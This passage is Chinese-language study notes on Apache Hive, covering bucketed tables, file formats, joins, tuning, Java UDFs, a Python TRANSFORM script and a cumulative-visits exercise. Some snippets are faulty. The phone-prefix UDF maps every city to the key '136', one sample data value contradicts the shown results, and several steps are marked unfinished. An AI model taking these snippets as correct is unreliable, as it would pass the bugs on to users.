可以直接在 hadoop UI 页面, 查看路径, 然后直接传到此路径中 hadoop fs -put ihivedata/partidata /user/hive/warehouse/mydb.db/t7/class=job1/city=beijing/p2 查看数据 select * from partition_table select count(*) from partition_table 删除表 drop table partition_table 工作中 用的最多的是 外部表 + 分区表 4.4 桶表 - 主要用于抽样查询桶表的基本操作 创建桶表完整过程 12345678910111213141516171819202122232425262728#创建分桶表drop table stu_buck;create table stu_buck(Sno int,Sname string,Sex string,Sage int,Sdept string)clustered by(Sno) sorted by(Sno DESC)into 4 bucketsrow format delimitedfields terminated by ',';#设置变量,设置分桶为true, 设置reduce数量是分桶的数量个数set hive.enforce.bucketing = true;set mapreduce.job.reduces=4;#开始往创建的分通表插入数据(插入数据需要是已分桶, 且排序的)#可以使用distribute by(sno) sort by(sno asc) 或是排序和分桶的字段相同的时候使用Cluster by(字段)#注意使用cluster by 就等同于分桶+排序(sort)insert into table stu_buckselect Sno,Sname,Sex,Sage,Sdept from student distribute by(Sno) sort by(Sno asc);insert overwrite table stu_buckselect * from student distribute by(Sno) sort by(Sno asc);insert overwrite table stu_buckselect * from student cluster by(Sno);-----以上3者效果一样的 保存select查询结果的几种方式： 将查询结果保存到一张新的hive表中 123create table t_tmpasselect * from t_p; 将查询结果保存到一张已经存在的hive表中 12insert into table t_tmpselect * from t_p; 将查询结果保存到指定的文件目录（可以是本地，也可以是hdfs） 12345insert overwrite local directory '/home/hadoop/test'select * from t_p;insert overwrite directory '/aaa/test'select * from t_p; 数据加载到桶表时，会对字段取hash值，然后与桶的数量取模。把数据放到对应的文件中。 所以顺序是打乱的, 不是原始 t1的数据顺序 查看数据 可以直接select * 查看全部 也可以直接单独查看每个桶的数据 123456789hive (mydb)&gt; dfs -cat /user/hive/warehouse/mydb.db/bucket_table/000000_0;4hive (mydb)&gt; dfs -cat /user/hive/warehouse/mydb.db/bucket_table/000001_0;51hive (mydb)&gt; dfs -cat /user/hive/warehouse/mydb.db/bucket_table/000002_0;2hive (mydb)&gt; dfs -cat /user/hive/warehouse/mydb.db/bucket_table/000003_0;3 修改桶的个数 alter table bucket_table clustered by (id) sorted by(id) into 10 buckets; 但是这样修改之后, 生成的是原来的 copy, 并且里面的数据也很奇怪, 不知道是按照什么来执行的? :TODO 注意： 物理上，每个桶就是表(或分区）目录里的一个文件 一个作业产生的桶(输出文件)和reduce任务个数相同 桶表工作中容易遇到的错误 向桶表中插入其它表查出的数据的时候, 必须指定字段名, 否则会报字段不匹配. 1234FAILED: SemanticException [Error 10044]: Line 1:12 Cannot insert into target table because column number/types are different 'bucket_table': Table insclause-0 has 1 columns, but query has 2 columns.# 应该是这样insert into bucket_table select id from t6; ※ 桶表的抽样查询 桶表的抽样查询 select * from bucket_table tablesample(bucket 1 out of 4 on id); tablesample是抽样语句 语法解析：TABLESAMPLE(BUCKET x OUT OF y) y必须是table总bucket数的倍数或者因子。 hive根据y的大小，决定抽样的比例。 例如，table总共分了64份，当y=32时，抽取(64/32=)2个bucket的数据，当y=128时，抽取(64/128=)1/2个bucket的数据。x表示从哪个bucket开始抽取。 例如，table总bucket数为32，tablesample(bucket 3 out of 16)，表示总共抽取（32/16=）2个bucket的数据，分别为第3个bucket和第（3+16=）19个bucket的数据。 5. Hive 视图的操作 使用视图可以降低查询的复杂度 视图的创建 create view v1 AS select t1.name from t1; 视图的删除 drop view if exists v1; 6. Hive 索引的操作 创建索引 create index t1_index on table t1(id) as &#39;org.apache.hadoop.hive.ql.index.compact.CompactIndexHandler&#39; with deferred rebuild in table t1_index_table; t1_index: 索引名称 as: 指定索引器 t1_index_table: 要创建的索引表 显示索引 show formatted index on t1; 重建索引 alter index t1_index on t1 rebuild; 重建完索引之后, 查看 t1_index_table 这张表, 就存了t1表文件具体的位置, 最后一列t1_index_table._offsets是 索引的偏移量, 类似于指针, 偏移量是索引的精髓 12345678hive (mydb)&gt; select * from t1_index_table;OKt1_index_table.id t1_index_table._bucketname t1_index_table._offsets1 hdfs://cs1:9000/user/hive/warehouse/mydb.db/t1/intdata [0]2 hdfs://cs1:9000/user/hive/warehouse/mydb.db/t1/intdata [2]3 hdfs://cs1:9000/user/hive/warehouse/mydb.db/t1/intdata [4]4 hdfs://cs1:9000/user/hive/warehouse/mydb.db/t1/intdata [6]5 hdfs://cs1:9000/user/hive/warehouse/mydb.db/t1/intdata [8] 分区字段本质上其实就是索引 7. 装载数据7.1 普通装载数据: 从本地 put 从 hive cp 从文件中装载数据 1hive&gt;LOAD DATA [LOCAL] INPATH '...' [OVERWRITE] INTO TABLE t2 [PARTITION (province='beijing')]; 通过查询表装载数据 12345678910111213141516# 方式1hive&gt;INSERT OVERWRITE TABLE t2 PARTITION (province='beijing') SELECT * FROM xxx WHERE xxx;# 方式2hive&gt;FROM t4 INSERT OVERWRITE TABLE t3 PARTITION (...) SELECT ...WHERE... INSERT OVERWRITE TABLE t3 PARTITION (...) SELECT ...WHERE... INSERT OVERWRITE TABLE t3 PARTITION (...) SELECT ...WHERE...; # 方式3 直接插入数据, 也会转化为文件的形式, 存在表的目录下- insert into table_name values(xxx); # 方式4 直接传文件 - load data (local) inpath ‘ xxx’ into table t_1; 7.2动态装载数据 不开启动态装载时 12hive&gt;INSERT OVERWRITE TABLE t3 PARTITION(province='bj', city='bj') SELECT t.province, t.city FROM temp t WHERE t.province='bj'; 开启动态分区支持 123hive&gt;set hive.exec.dynamic.partition=true;hive&gt;set hive.exec.dynamic.partition.mode=nostrict;hive&gt;set hive.exec.max.dynamic.partitions.pernode=1000; 把 t6 表的所有的字段 (包括分区字段) 加载进 t9 对应的分区 1hive (mydb)&gt; insert overwrite table t9 partition(class) select id,class from t6; 单语句建表并同时装载数据 1hive&gt;CREATE TABLE t4 AS SELECT .... 8. 导出数据 在hdfs之间复制文件(夹) hadoop fs -cp source destination hive&gt; dfs -cp source destination 案例: hive&gt; dfs -get /user/hive/warehouse/mydb.db/t9 /root/t9; 从 hdfs 复制到本地 使用DIRECTORY hive&gt;INSERT OVERWRITE 【LOCAL】 DIRECTORY &#39;...&#39; SELECT ...FROM...WHERE ...; 案例:通过查询导出到 t9, 走的 MapReduce 导到到 hdfs: insert overwrite directory &quot;/home/t9&quot; select * from t9; 导出到本地: insert overwrite local directory &quot;/home/ap/t9&quot; select * from t9; 9. 读模式&amp;写模式 RDBMS是写模式 Hive是读模式 10. 完整建表语句语法12345678910111213CREATE [EXTERNAL] TABLE [IF NOT EXISTS] [db_name.]table_name [(col_name data_type [COMMENT col_comment], ...)] [COMMENT table_comment] [PARTITIONED BY (col_name data_type [COMMENT col_comment], ...)] [CLUSTERED BY (col_name, col_name, ...) [SORTED BY (col_name [ASC|DESC], ...)] INTO num_buckets BUCKETS] [SKEWED BY (col_name, col_name, ...) ON ([(col_value, col_value, ...), ...|col_value, col_value, ...]) [STORED AS DIRECTORIES] ] [ [ROW FORMAT row_format] [STORED AS file_format] | STORED BY 'storage.handler.class.name' [WITH SERDEPROPERTIES (...)] ] [LOCATION hdfs_path] [TBLPROPERTIES (property_name=property_value, ...)] [AS select_statement] (Note: not supported when creating external tables.) 11. 文件格式 TextFile SequenceFile RCFile ORC 11.1 默认存储格式就是 TextFile 存储空间消耗比较大， 并且压缩的text 无法分割和合并 查询的效率最低,可以直接存储， 加载数据的速度最高 11.2 使用SequenceFile存储 存储空间消耗大 压缩的文件可以分割和合并 查询效率高 需要通过text文件转化来加载 12345678910111213hive&gt; create table test2(str STRING) STORED AS SEQUENCEFILE; set hive.exec.compress.output=true;set mapred.output.compress=true;set mapred.output.compression.codec=com.hadoop.compression.lzo.LzoCodec;set io.seqfile.compression.type=BLOCK;set io.compression.codecs=com.hadoop.compression.lzo.LzoCodec;INSERT OVERWRITE TABLE test2 SELECT * FROM test1; 注意点: SequenceFile 类型的表, 不能直接导入数据文件, 只能通过从他表查询 insert overwrite table t2 select * from t1; 123# 查看此 'SequenceFile' 表hive (db2)&gt; dfs -cat /user/hive/warehouse/db2.db/t2/000000_0 ;SEQ"org.apache.hadoop.io.BytesWritableorg.apache.hadoop.io.Text*org.apache.hadoop.io.compress.DefaultCodec���/*&lt;bb�m�?x�c453x�c464x�c475x�c486x�c497hive (db2)&gt; 11.3 使用RCFile存储RCFILE是一种行列存储相结合的存储方式。首先，其将数据按行分块，保证同一个record在一个块上，避免读一个记录需要读取多个block。其次，块数据列式存储，有利于数据压缩和快速的列存取。 rcfile 存储空间最小 查询的效率最高 需要通过text文件转化来加载 加载的速度最低 123456789101112hive&gt; create table test3(str STRING) STORED AS RCFILE; set hive.exec.compress.output=true;set mapred.output.compress=true;set mapred.output.compression.codec=com.hadoop.compression.lzo.LzoCodec;set io.compression.codecs=com.hadoop.compression.lzo.LzoCodec;INSERT OVERWRITE TABLE test3 SELECT * FROM test1; 注意点: RCFile 也只能从其它表导入数据 12hive (db2)&gt; dfs -cat /user/hive/warehouse/db2.db/t3/000000_0;RCF*org.apache.hadoop.io.compress.DefaultCodechive.io.rcfile.column.number1 11.4 使用ORC存储(最好的一种格式)是一种针对 RCFile 优化的格式 主要特点: 压缩, 索引, 单文件输出 12345678910111213hive&gt; create table t1_orc(id int, name string) row format delimited fields terminated by '\t' stored as orc tblproperties("orc.compress"="ZLIB");ALTER TABLE ... [PARTITION partition_spec] SET FILEFORMAT ORC;# 也可以改为其它的, 修改的语法就是这样alter table t1 set fileformat textfile;SET hive.default.fileformat=Orc;insert overwrite table t1_orc select * from t1; 注意点: ORC 也只能从其它表导入数据 占用空间大, 一个 block 有256M, 之前2种都是128M 1234567891011hive (db2)&gt; dfs -cat /user/hive/warehouse/db2.db/t4/000000_0;ORCP+P �6�b�``���ь@�H� 1q01-PPK# (" id0P:P@�;��" (0��ORChive 12. 序列化 &amp; 反序列化 (Hive SerDe)12.1 SerDe What is a SerDe? SerDe 是 “Serializer and Deserializer.”的缩写 Hive 使用 SerDe和FileFormat进行行内容的读写. Hive序列化流程 从 HDFS 上读入文件 (反序列化) HDFS文件 --&gt; InputFileFormat --&gt; &lt;key, value&gt; --&gt; Deserializer --&gt; 行对象 写出到 HDFS (序列化) 行对象 --&gt; Serializer --&gt; &lt;key, value&gt; --&gt; OutputFileFormat --&gt; HDFS文件 注意: 数据全部存在在value中，key内容无意义 Hive 使用如下FileFormat 类读写 HDFS files: TextInputFormat/HiveIgnoreKeyTextOutputFormat: 读写普通HDFS文本文件. SequenceFileInputFormat/SequenceFileOutputFormat: 读写SequenceFile格式的HDFS文件 …. Hive 使用如下SerDe 类(反)序列化数据: MetadataTypedColumnsetSerDe: 读写csv、tsv文件和默认格式文件 ThriftSerDe: 读写Thrift 序列化后的对象. DynamicSerDe: 读写Thrift序列化后的对象, 不过不需要解读schema中的ddl. 12.2 使用CSV SerdeCSV格式的文件也称为逗号分隔值（Comma-Separated Values，CSV，有时也称为字符分隔值，因为分隔字符也可以不是逗号。在本文中的CSV格式的数据就不是简单的逗号分割的），其文件以纯文本形式存储表格数据（数字和文本）。CSV文件由任意数目的记录组成，记录间以某种换行符分隔；每条记录由字段组成，字段间的分隔符是其它字符或字符串，最常见的是逗号或制表符。通常，所有记录都有完全相同的字段序列。默认的分隔符是 DEFAULT_ESCAPE_CHARACTER \DEFAULT_QUOTE_CHARACTER “ —如果没有，则不需要指定DEFAULT_SEPARATOR , 12345678CREATE TABLE csv_table(a string, b string) ROW FORMAT SERDE 'org.apache.hadoop.hive.serde2.OpenCSVSerde' WITH SERDEPROPERTIES ("separatorChar"="\t", "quoteChar"="'", "escapeChar"="\\") STORED AS TEXTFILE;# separatorChar：分隔符# quoteChar：引号符# escapeChar：转义符&gt;&gt; :TODO 创建表没成功, 用到时再说 13. Lateral View 语法lateral view用于和split, explode等UDTF一起使用，它能够将一行数据拆成多行数据，在此基础上可以对拆分后的数据进行聚合。lateral view首先为原始表的每行调用UDTF，UTDF会把一行拆分成一或者多行，lateral view再把结果组合，产生一个支持别名表的虚拟表。 lateral: 侧面, 横切面 Lateral View: 切面表 创建表 create table t8(name string,nums array\&lt;int>)row format delimited fields terminated by “\t” COLLECTION ITEMS TERMINATED BY ‘:’; 数据切割 SELECT name,new_num FROM t8 LATERAL VIEW explode(nums) num AS new_num; select name,id from class_test lateral view explode(student_id_list) list as id; 注意: as 前面的 list 貌似是可以随表起名的 效果演示 12345678910111213141516171819202122hive (default)&gt; select * from class_test;OKclass_test.name class_test.student_id_listzhangsan [24,25,27,37]lisi [28,39,23,43]wangwu [25,23,2,54]---hive (default)&gt; select name,id from class_test lateral view explode(student_id_list) list as id;OKname idzhangsan 24zhangsan 25zhangsan 27zhangsan 37lisi 28lisi 39lisi 23lisi 43wangwu 25wangwu 23wangwu 2wangwu 54 14. Hive的高级函数14.1 简介 简单查询 select … from…where… 使用各种函数 hive&gt;show functions; 展示所有函数 hive&gt;describe function xxx; 详细描述函数用法 LIMIT语句 列别名 嵌套select语句 14.2 高级函数分类 标准函数 reverse() upper() 聚合函数 avg() sum() 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657select avg(id) from t3;select sum(id) from t3;# 最简答的嵌套hive (mydb)&gt; select t.id from (select * from t1 where id &gt; 3)t;# 最简单的 group by# if else 的效果select id, case when id &lt;= 2 then 'low'when id&gt;=3 and id &lt;4 then 'middle'when id&gt;=4 and id &lt;5 then 'high'else 'very high'end as id_highly from t1;----执行结果----id id_highly1 low2 low3 middle4 high5 very high--------------------select sid,case coursewhen 'yuwen' then scoreelse '0'end(别名) yuwencase coursewhen 'shuxue' then scoreelse '0'end(别名) shuxue# cast 转换函数, 大概是这么用hive (mydb)&gt; select id from t1 where cast(id AS FLOAT) &lt;3.0;OKid12 - ![image-20180619150824031](http://p6i5vzkfk.bkt.clouddn.com/study/2018-06-19-070824.png) 首先当前不存在的列补0, 然后按照学号分组求和 ​ 然后按照 sid 分组求和/求最大值, 就可以了 同一列不同的放在不同的列上, 常用的方法 面试题4 array_contains() desc function array_contains() 自定义函数 UDF 15. Hive 性能调优15.1 什么时候可以避免执行MapReduce？ select * or select field1,field2 limite 10 where语句中只有分区字段 使用本地set hive.exec.mode.local.auto=true; 12345select * from t3;select name,age from t3;select name,age from t3 limit 2;select name,age from t3 where age=25;# 当 where 是本地字段(列中的字段), 是不走 MR的 group by语句： 通常和聚合函数一起使用，按照一个或者多个列对结果进行分组，然后对每组执行聚合操作 having语句： 限制结果的输出 hive将查询转化为MapReduce执行，hive的优化可以转化为mapreduce的优化！ 15.2 hive是如何将查询转化为MapReduce的？-EXPLAIN的使用 hive对sql的查询计划信息解析 EXPLAIN SELECT COUNT(1) FROM T1; EXPLAIN EXTENDED 显示详细扩展查询计划信息 EXPLAIN EXTENDED SELECT COUNT(1) FROM T1; 为啥我的 explain extended 只有固定的几行? 因为这个 count 没有调动 MR, 用 sum 就会启用 MR, 会出现长长的 log 12345678910111213141516171819---不会启用 MRhive (mydb)&gt; explain EXTENDED select count(1) from t9;---ExplainSTAGE DEPENDENCIES: Stage-0 is a root stage ...--------------------------------这里会启用 MRhive (mydb)&gt; explain EXTENDED select sum(id) from t9;---ExplainSTAGE DEPENDENCIES: Stage-1 is a root stage Stage-0 depends on stages: Stage-1STAGE PLANS: Stage: Stage-1 .... 15.3 性能调优15.3.1 本地mr 本地模式设置方式： set mapred.job.tracker=local; mapper 的本地模式, 只有在开发中才会使用 set hive.exec.mode.local.auto=true; Hive 的执行模式 可以用在生产中, 因为是自动模式, 可根据参数变化 设置这里才会转成 local hadoop 按照这里设定的规则hive.exec.mode.local.auto.input.files.max 测试 select 1 from wlan limit 5; 下面两个参数是local mr中常用的控制参数: hive.exec.mode.local.auto.inputbytes.max默认134217728 设置local mr的最大输入数据量,当输入数据量小于这个值的时候会采用local mr的方式 hive.exec.mode.local.auto.input.files.max默认是4 设置local mr的最大输入文件个数,当输入文件个数小于这个值的时候会采用local mr的方式 大于此数时, 就不会转化为 local hadoop 1Cannot run job locally: Number of Input Files (= 6) is larger than hive.exec.mode.local.auto.input.files.max(= 4) 可以这样修改local mr的最大输入文件个数值, 主要在调试阶段使用 1234hive (mydb)&gt; set hive.exec.mode.local.auto.input.files.max=8;# 这样设置了之后, 只要文件数&lt;=8, 就会在本地运行Job running in-process (local Hadoop) 15.3.2 开启并行计算 开启并行计算,增加集群的利用率 set hive.exec.parallel=true; 15.3.3 设置严格模式 设置严格模式 set hive.mapred.mode=strict; 设置非严格模式 set hive.mapred.mode=nonstrict; strict可以禁止三种类型的查询： 强制分区表的where条件过滤 Order by语句必须使用limit hive (mydb)&gt; select id from t9 where class=&#39;job110&#39; order by id limit 3; 限制笛卡尔积查询 15.3.4 调整mapper和reducer的数量 调整mapper和reducer的数量 太多map导致启动产生过多开销 marpred.min.split.size 按照输入数据量大小确定reducer数目, `set mapred.reduce.tasks= 默认3 dfs -count /分区目录/* hive.exec.reducers.max设置阻止资源过度消耗 JVM重用 小文件多或task多的业务场景 set mapred.job.reuse.jvm.num.task=10 会一直占用task槽 15.3.5 排序方面的优化 order by 语句：是全局排序, 用的比较多 123# 加个 desc 就是倒序排序hive (mydb)&gt; select id from bucket_table order by id desc limit 10;Automatically selecting local only mode for query sort by 语句： 是单reduce排序 一般与 distribute by结合使用 distribute by语句：类似于分桶，根据指定的字段将数据分到不同的 reducer，且分发算法是 hash 散列 与 sort by 结合用的比较多, 在每个分区内有序 12# 注意此处 distribute 的作用hive (mydb)&gt; select id from bucket_table distribute by id sort by id desc limit 10; cluster by语句： select * from t9 cluster by id; 可以确保类似的数据的分发到同一个reduce task中，并且保证数据有序, 防止所有的数据分发到同一个reduce上，导致整体的job时间延长 cluster by语句的等价语句： 如果分桶和sort字段是同一个时，此时，cluster by = distribute by + sort by distribute by Word sort by Word ASC 15.3.6 Map-side聚合可以直接在 .hiverc中配置 set hive.map.aggr=true; 这个设置可以将顶层的聚合操作放在Map阶段执行，从而减轻清洗阶段数据传输和Reduce阶段的执行时间，提升总体性能。:TODO 不太懂 缺点：该设置会消耗更多的内存。 执行select count(1) from wlan; 15.3.6 Join 优化 优先过滤后再进行 Join 操作，最大限度的减少参与 join 的数据量 小表 join 大表，最好启动 mapjoin 在使用写有 Join 操作的查询语句时有一条原则:应该将条目少的表/子查询放在 Join 操作 符的左边。 Join on 的条件相同的话，最好放入同一个 job，并且 join 表的排列顺序从小到大 在编写 Join 查询语句时，如果确定是由于 join 出现的数据倾斜，那么请做如下设置: set hive.skewjoin.key=100000; // 这个是 join 的键对应的记录条数超过这个值则会进行 分拆，值根据具体数据量设置 set hive.optimize.skewjoin=true; // 如果是 join 过程出现倾斜应该设置为 true 16. 表连接 (只支持等值连接) 16.1 简介 INNER JOIN 两张表中都有，且两表符合连接条件 select t1.name,t1.age,t9.age from t9 join t1 on t1.name=t9.name; LEFT OUTER JOIN 左表中符合where条件出现，右表可以为空 从左表返回所有的行(字段), 右表没有匹配where 条件的话返回null RIGHT OUTER JOIN 右表中符合where条件出现，左表可以为空 FULL OUTER JOIN 返回所有表符合where条件的所有记录，没有NULL替代 LEFT SEMI-JOIN 左表中符合右表on条件出现，右表不出现 Hive 当前没有实现 IN/EXISTS 子查询，可以用 LEFT SEMI JOIN 重写子查询语句。LEFT SEMI JOIN 的限制是， JOIN 子句中右边的表只能在 ON 子句中设置过滤条件，在 WHERE 子句、SELECT 子句或其他地方过滤都不行。 12345SELECT a.key, a.value FROM aWHERE a.key in (SELECT b.key FROM B);# 可以被重写为：SELECT a.key, a.val FROM a LEFT SEMI JOIN b on (a.key = b.key) 笛卡尔积 是m x n的结果 map-side JOIN 只有一张小表，在mapper的时候将小表完全放在内存中 select /+ mapjoin(t9) /t1.name,t1.age from t9 JOIN t1on t1.name=t9.name; 16.2 代码测试1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192关于hive中的各种join准备数据1,a2,b3,c4,d7,y8,u2,bb3,cc7,yy9,pp建表：create table a(id int,name string)row format delimited fields terminated by ',';create table b(id int,name string)row format delimited fields terminated by ',';导入数据：load data local inpath '/home/hadoop/a.txt' into table a;load data local inpath '/home/hadoop/b.txt' into table b;实验：** inner joinselect * from a inner join b on a.id=b.id;+-------+---------+-------+---------+--+| a.id | a.name | b.id | b.name |+-------+---------+-------+---------+--+| 2 | b | 2 | bb || 3 | c | 3 | cc || 7 | y | 7 | yy |+-------+---------+-------+---------+--+**left joinselect * from a left join b on a.id=b.id;+-------+---------+-------+---------+--+| a.id | a.name | b.id | b.name |+-------+---------+-------+---------+--+| 1 | a | NULL | NULL || 2 | b | 2 | bb || 3 | c | 3 | cc || 4 | d | NULL | NULL || 7 | y | 7 | yy || 8 | u | NULL | NULL |+-------+---------+-------+---------+--+**right joinselect * from a right join b on a.id=b.id;**select * from a full outer join b on a.id=b.id;+-------+---------+-------+---------+--+| a.id | a.name | b.id | b.name |+-------+---------+-------+---------+--+| 1 | a | NULL | NULL || 2 | b | 2 | bb || 3 | c | 3 | cc || 4 | d | NULL | NULL || 7 | y | 7 | yy || 8 | u | NULL | NULL || NULL | NULL | 9 | pp |+-------+---------+-------+---------+--+**select * from a left semi join b on a.id = b.id;+-------+---------+--+| a.id | a.name |+-------+---------+--+| 2 | b || 3 | c || 7 | y |+-------+---------+--+ 17. Hive自定义函数 &amp; Transform17.1 自定义函数类别 UDF 作用于单个数据行，产生一个数据行作为输出。（数学函数，字符串函数） UDAF (用户定义聚集函数)：接收多个输入数据行，并产生一个输出数据行。（count，max） 17.2 UDF 开发实例17.2.1 简单入门 先开发一个java类，继承UDF，并重载evaluate方法 12345678910package com.rox.hive.udf;import org.apache.hadoop.hive.ql.exec.UDF;public class ToLowerCase extends UDF &#123; // 必须是 public public String evaluate(String field) &#123; String res = field.toLowerCase(); return res; &#125;&#125; 打成jar包上传到服务器 将jar包添加到hive的classpath hive&gt;add JAR /home/ap/udf.jar; 创建临时函数与开发好的java class关联 Hive&gt;create temporary function tolowercase as &#39;com.rox.hive.udf.ToLowerCase&#39;; 即可在hql中使用自定义的函数strip select tolowercase(name) from t_1.. 17.2.2 稍稍复杂123456789101112131415161718192021222324252627282930313233343536373839404142# 需求: 通过一些手机号判断手机区域1364535532,101374535532,421384535532,341364535532,451384535532,22136-beijing137-shanghai138-guangzhou-----## 1.编写 UDF public static HashMap&lt;String, String&gt; provinceMap = new HashMap&lt;String, String&gt;(); static &#123; provinceMap.put("136", "beijing"); provinceMap.put("136", "shanghai"); provinceMap.put("136", "guangzhou"); &#125; public String evaluate(String phoneNum) &#123; return provinceMap.get(phoneNum.substring(0, 3)) == null ? "huoxing" : provinceMap.get(phoneNum.substring(0, 3)); &#125; ## 2.打包上传, 添加到 classpath, 创建临时函数## 3.创建表,加载数据create table flow_t(pnum string,flow int)row format delimited fields terminated by ',';load data local inpath '/home/ap/ihivedata/flow.tmp' into table flow_t;## 4.使用0: jdbc:hive2://cs2:10000&gt; select pnum,tolow(pnum),flow from flow_t;+-------------+------------+-------+| pnum | _c1 | flow |+-------------+------------+-------+| 1364535532 | guangzhou | 10 || 1374535532 | huoxing | 42 || 1384535532 | huoxing | 34 || 1364535532 | guangzhou | 45 || 1384535532 | huoxing | 22 |+-------------+------------+-------+ 17.2.3 有些复杂12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788# 解析 json 数据表 rating.json## 1. 写 udf// com.rox.json.MovieRateBean package com.rox.json;import lombok.Getter;import lombok.Setter;@Getter@Setterpublic class MovieRateBean &#123; private String movie; private String rate; private String timeStamp; private String uid; @Override public String toString() &#123; return movie + "\t" + rate + "\t" + timeStamp + "\t" + uid; &#125;&#125;// com.rox.json.JsonParser package com.rox.json;import java.io.IOException;import org.apache.hadoop.hive.ql.exec.UDF;import com.fasterxml.jackson.databind.ObjectMapper;public class JsonParser extends UDF &#123; public String evaluate(String jsonLine) &#123; ObjectMapper objectMapper = new ObjectMapper(); try &#123; MovieRateBean bean = objectMapper.readValue(jsonLine, MovieRateBean.class); return bean.toString(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; return ""; &#125;&#125;====================================================## 2.打包上传, 添加到 classpath, 创建临时函数, 检查是否成功show functions;## 3.创建表,加载数据create table t_json(line string) row format delimited;load data local inpath '/home/ap/ihivedata/flow.log' into table t_json;## 4.检查数据select * from t_json limit 10;## 5.调用函数0: jdbc:hive2://cs2:10000&gt; select jsonparser(line)parsedline from t_json limit 10;+---------------------+| parsedline |+---------------------+| 1193 5 978300760 1 || 661 3 978302109 1 || 914 3 978301968 1 || 3408 4 978300275 1 || 2355 5 978824291 1 || 1197 3 978302268 1 || 1287 5 978302039 1 || 2804 5 978300719 1 || 594 4 978302268 1 || 919 4 978301368 1 |+---------------------+// 但是这样只是把每一行解析出来了, ## 6.删除原来的表 drop table if exists t_rating;## 7.重新创建一个表create table t_rating(movieid string,rate int,timestring string,uid string)row format delimited fields terminated by '\t';## 8.根据查出来的每一行, 按照 '\t'分割, 然后再插入到表中create table t_rating asselect split(jsonparser(line),'\t')[0]as movieid, split(jsonparser(line),'\t')[1] as rate, split(jsonparser(line),'\t')[2] as timestring, split(jsonparser(line),'\t')[3] as uid from t_json limit 10;// 但是执行结果会报错,不知道为啥,难道是 java 代码的问题? :TODO-------## 9.内置json函数select get_json_object(line,'$.movie') as moive,get_json_object(line,'$.rate') as rate from rat_json limit 10; 17.3 Transform实现12345678910111213141516171819202122232425262728293031323334353637383940414243# 1、先加载rating.json文件到hive的一个原始表 t_jsoncreate table rat_json(line string) row format delimited;load data local inpath '/home/ap/rating.json' into table t_json;2、需要解析json数据成四个字段，插入一张新的表 t_ratingdrop table if exists t_rating;# 创建表create table t_rating(movieid string,rate int,timestring string,uid string)row format delimited fields terminated by '\t';# 插入, 也可以直接创建 create table xx as + select...insert overwrite table t_ratingselect get_json_object(line,'$.movie') as moiveid, get_json_object(line,'$.rate') as rate, get_json_object(line,'$.timeStamp') as timestring,get_json_object(line,'$.uid') as uid from t_json;3. 写一个 python 脚本vi weekday_mapper.py#!/bin/pythonimport sysimport datetimefor line in sys.stdin: line = line.strip() movieid, rating, timestring,userid = line.split('\t') weekday = datetime.datetime.fromtimestamp(float(timestring)).isoweekday() print '\t'.join([movieid, rating, str(weekday),userid]) 4. 保存文件, 然后将文件加入 hive 的 classpathhive&gt;add FILE /home/hadoop/weekday_mapper.py;5. 此时可以直接创建新表hive&gt;create TABLE u_data_new asSELECT TRANSFORM (movieid, rate, timestring,uid) USING 'python weekday_mapper.py' AS (movieid, rate, weekday,uid)FROM t_rating;6. 查询结果## distinct看看有多少个不重复的数字select distinct(weekday) from u_data_new limit 10; 18. 案例18.1 广告推送-用户画像的介绍一个广告推送平台的项目结构示意图 18.2 累计报表实现套路(面试)题: 求每个月的累计访问次数 此处的访问次数可以换成工资,等等.. 有如下访客访问次数统计表 t_access_times 访客 月份 访问次数 A 2015-01 5 A 2015-01 15 B 2015-01 5 A 2015-01 8 B 2015-01 25 A 2015-01 5 A 2015-02 4 A 2015-02 6 B 2015-02 10 B 2015-02 5 …… …… …… 需要输出报表：t_access_times_accumulate 访客 月份 月访问总计 累计访问总计 A 2015-01 33 33 A 2015-02 10 43 ……. ……. ……. ……. B 2015-01 30 30 B 2015-02 15 45 ……. ……. ……. ……. 解题代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081# 准备数据vi t_access_timesA,2015-01,5A,2015-01,15B,2015-01,5A,2015-01,8B,2015-01,254A,2015-01,5A,2015-02,4A,2015-02,6B,2015-02,10B,2015-02,5----# 建表create table t_access_times(username string,month string,salary int)row format delimited fields terminated by ',';# 加载数据load data local inpath '/home/ap/t_access_times' into table t_access_times;1、第一步，先求个用户的月总金额select username,month,sum(salary) as salary from t_access_times group by username,month;+-----------+----------+---------+--+| username | month | salary |+-----------+----------+---------+--+| A | 2015-01 | 33 || A | 2015-02 | 10 || B | 2015-01 | 30 || B | 2015-02 | 15 |+-----------+----------+---------+--+2、第二步，将月总金额表 自己连接 自己连接create table aa as(select username,month,sum(salary) as salary from t_access_times group by username,month) A inner join (select username,month,sum(salary) as salary from t_access_times group by username,month) BA.username=B.username+-------------+----------+-----------+-------------+----------+-----------+--+| a.username | a.month | a.salary | b.username | b.month | b.salary |+-------------+----------+-----------+-------------+----------+-----------+--+| A | 2015-01 | 33 | A | 2015-01 | 33 || A | 2015-01 | 33 | A | 2015-02 | 10 || A | 2015-02 | 10 | A | 2015-01 | 33 || A | 2015-02 | 10 | A | 2015-02 | 10 || B | 2015-01 | 30 | B | 2015-01 | 30 || B | 2015-01 | 30 | B | 2015-02 | 15 || B | 2015-02 | 15 | B | 2015-01 | 30 || B | 2015-02 | 15 | B | 2015-02 | 15 |+-------------+----------+-----------+-------------+----------+-----------+--+3、第三步，从上一步的结果中进行分组查询，分组的字段是a.username a.month求月累计值： 将b.month &lt;= a.month的所有b.salary求和即可select A.username,A.month,max(A.salary) as salary,sum(B.salary) as accumulatefrom (select username,month,sum(salary) as salary from t_access_times group by username,month) A inner join (select username,month,sum(salary) as salary from t_access_times group by username,month) BonA.username=B.usernamewhere B.month &lt;= A.monthgroup by A.username,A.monthorder by A.username,A.month;+-------------+----------+---------+-------------+| a.username | a.month | salary | accumulate |+-------------+----------+---------+-------------+| A | 2015-01 | 33 | 33 || A | 2015-02 | 10 | 43 || B | 2015-01 | 259 | 259 || B | 2015-02 | 15 | 274 |+-------------+----------+---------+-------------+ 18.3 待做项目 19.注意点 使用聚合函数, 后面一定要分组(group by xxx), group by 会自动去重 如果 sql 语句中有 group by, 那么 select 后面必须有 group by 的字段, 或聚合函数 使用order by 排序某个字段时, 必须在 select中出现此字段, 否则会找不到 :TODO 待验证]]></content>
      <categories>
        <category>Hadoop</category>
        <category>Hive</category>
